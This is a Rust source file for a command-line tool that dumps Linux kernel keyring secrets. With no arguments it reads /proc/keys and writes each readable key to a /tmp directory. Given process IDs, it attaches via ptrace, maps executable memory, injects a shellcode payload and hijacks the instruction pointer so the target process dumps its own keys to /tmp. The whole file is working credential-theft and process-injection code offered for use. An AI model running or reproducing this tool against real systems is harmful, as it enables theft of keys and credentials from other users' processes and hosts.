mod keyctl;
mod readin;
mod shc;
mod tracer;
use crate::readin::read_inputs;
use crate::shc::KEYDUMP_SHC;
use clap::Parser;
use clap_verbosity_flag::{Verbosity, WarnLevel};
use libc;
use log;
use std::{
    fs::{self, File},
    io::{self, Write},
    path::Path,
    str,
    thread::sleep,
    time::Duration,
};

/// Dump keys
#[derive(Parser)]
#[command(author, version, about, long_about = None)]
struct Cli {
    pid: Vec<String>,

    #[command(flatten)]
    verbose: Verbosity<WarnLevel>,
}

fn main() {
    let args = Cli::parse();
    env_logger::Builder::new()
        .format_timestamp(None)
        .format_target(false)
        .filter_level(args.verbose.log_level_filter())
        .init();

    if args.pid.is_empty() {
        dump_local();
    } else {
        dump_remote(args.pid);
    }
}

fn dump_remote(pids_str: Vec<String>) {
    let mut injected_pids = Vec::new();

    for pid_str in read_inputs(pids_str, false, true) {
        let pid: u16 = match pid_str.parse() {
            Ok(u) => u,
            Err(_) => {
                log::error!("Invalid pid value: {}", pid_str);
                continue;
            }
        };
        let pid = pid as i32;
        match dump_remote_process_keys(pid, KEYDUMP_SHC) {
            Err(err) => {
                log::error!("{}", err);
                if err.contains("Attach Error")
                    && err.contains("Operation not permitted")
                {
                    log::error!("You may need CAP_SYS_PTRACE, which usually means becoming root");
                }
            }
            Ok(_) => {
                injected_pids.push(pid);
                println!("[PID {}] Shellcode injected", pid);
            }
        }
    }

    if !injected_pids.is_empty() {
        sleep(Duration::from_millis(1000));
    }
    for pid in injected_pids {
        let keys_dir = format!("/tmp/k_{}", pid);
        if Path::new(&keys_dir).exists() {
            println!(
                "[PID {}] {} exists, so keys must be dumped!!",
                pid, keys_dir
            )
        } else {
            println!(
                "[PID {}] {} doesn't exists, maybe some problem happened in the shellcode",
                pid, keys_dir
            )
        }
    }
}

fn dump_remote_process_keys(pid: i32, shc: &[u8]) -> Result<(), String> {
    tracer::basics::attach_process(pid)?;

    let result = dump_keys_in_context(pid, shc);
    let _ = tracer::basics::detach_process(pid);
    return result;
}

fn dump_keys_in_context(pid: i32, shc: &[u8]) -> Result<(), String> {
    // tracer::ptrace::syscall(pid, 0)?;
    // tracer::basics::wait_for_stop(pid)?;

    let (info, _) =
        tracer::ptrace::get_syscall_info(pid).map_err(|e| e.to_string())?;

    if info.stack_pointer < 0x100000000 {
        return Err(format!("Target in 32 bit mode. Not supported (yet)"));
    }

    let syscall_addr = tracer::x64::syscall::search_syscall_inst_nearby(pid)?;
    log::debug!("Syscall address: 0x{:x}", syscall_addr);

    let regs = tracer::x64::ptrace::getregs_x64(pid)?;
    log::debug!("Orig_rax: 0x{:x}", regs.orig_rax);

    // we are in a syscall so when we detach, we have to
    // reexecute it
    let rip_offset = if regs.orig_rax as i32 != -1 { 2 } else { 0 };

    let mmap_addr = tracer::x64::syscall::exec_mmap_x64(
        pid,
        syscall_addr,
        0,
        shc.len() as u64,
        libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
        libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
        -1,
        0,
    )?;
    log::debug!("Memory map at 0x{:x}", mmap_addr);

    if let Err(e) = prepare_shc_execution(pid, shc, mmap_addr, rip_offset) {
        let _ = tracer::x64::syscall::exec_munmap_x64(
            pid,
            syscall_addr,
            mmap_addr,
            shc.len() as u64,
        );
        return Err(e);
    }

    return Ok(());
}

fn prepare_shc_execution(
    pid: i32,
    shc: &[u8],
    map_addr: u64,
    rip_offset: u64,
) -> Result<(), String> {
    tracer::x64::basics::write_memory_x64(pid, map_addr, shc)?;

    let rip = tracer::x64::register::rip(pid)?;

    tracer::x64::basics::stack_push_x64(pid, rip - rip_offset)?;

    tracer::x64::register::set_rip(pid, map_addr + rip_offset)?;

    return Ok(());
}

fn dump_local() {
    if let Err(e) = dump_local_keys() {
        log::error!("{}", e);
    }
}

fn dump_local_keys() -> Result<(), String> {
    let entries = parse_proc_keys()
        .map_err(|e| format!("Error parsing /proc/keys: {}", e))?;

    let keys_dir = format!("/tmp/k_self_{}", getuid());
    match fs::create_dir_all(&keys_dir) {
        Err(e) => {
            if e.kind() != io::ErrorKind::AlreadyExists {
                return Err(format!(
                    "Unable to create keys directory {}: {}",
                    keys_dir, e
                ));
            }
        }
        Ok(_) => {}
    }

    for entry in entries {
        let description = normalize_description(&entry.description);
        let filename =
            format!("{:x}_{}_{}", entry.id, entry.type_, description);
        match keyctl::read_key(entry.id) {
            Err(e) => {
                if e.0 == 1 {
                    log::error!(
                        "{}: Error {} ({}) Permissions:{} uid:{} gid:{}",
                        filename,
                        -e.0,
                        e,
                        entry.permissions,
                        entry.uid,
                        entry.gid
                    );
                } else {
                    log::error!("{}: Error {} ({})", filename, -e.0, e);
                }
            }
            Ok(data) => {
                let key_filepath = format!("{}/{}", keys_dir, filename);
                if let Err(e) = write_to_file(&key_filepath, &data) {
                    log::error!("{}", e);
                }
            }
        }
    }

    println!("Files written to {}", keys_dir);

    return Ok(());
}

fn write_to_file(filepath: &str, data: &[u8]) -> Result<(), String> {
    let mut f = File::options()
        .create(true)
        .write(true)
        .open(filepath)
        .map_err(|e| format!("Error creating {}: {}", filepath, e))?;

    f.write_all(data)
        .map_err(|e| format!("Error writing file {}: {}", filepath, e))?;
    return Ok(());
}

fn normalize_description(desc: &str) -> String {
    let mut n_desc = String::new();
    for c in desc.chars().take(30) {
        if c.is_alphabetic() || c.is_numeric() {
            n_desc.push(c);
        } else {
            n_desc.push('_');
        }
    }

    return n_desc.trim_end_matches("_").to_string();
}

fn parse_proc_keys() -> Result<Vec<ProcKeysEntry>, io::Error> {
    let mut entries = Vec::new();
    for line in fs::read_to_string("/proc/keys")?.lines() {
        let parts: Vec<&str> = line.split(" ").filter(|x| x != &"").collect();
        entries.push(ProcKeysEntry {
            id: i32::from_str_radix(parts[0], 16).unwrap(),
            permissions: parts[4].into(),
            uid: parts[5].parse().unwrap(),
            gid: parts[6].parse().unwrap(),
            type_: parts[7].into(),
            description: parts[8..].join(" "),
        });
    }

    return Ok(entries);
}

fn getuid() -> u32 {
    return unsafe { libc::getuid() };
}

#[derive(Debug)]
struct ProcKeysEntry {
    id: i32,
    permissions: String,
    uid: i32,
    gid: i32,
    type_: String,
    description: String,
}
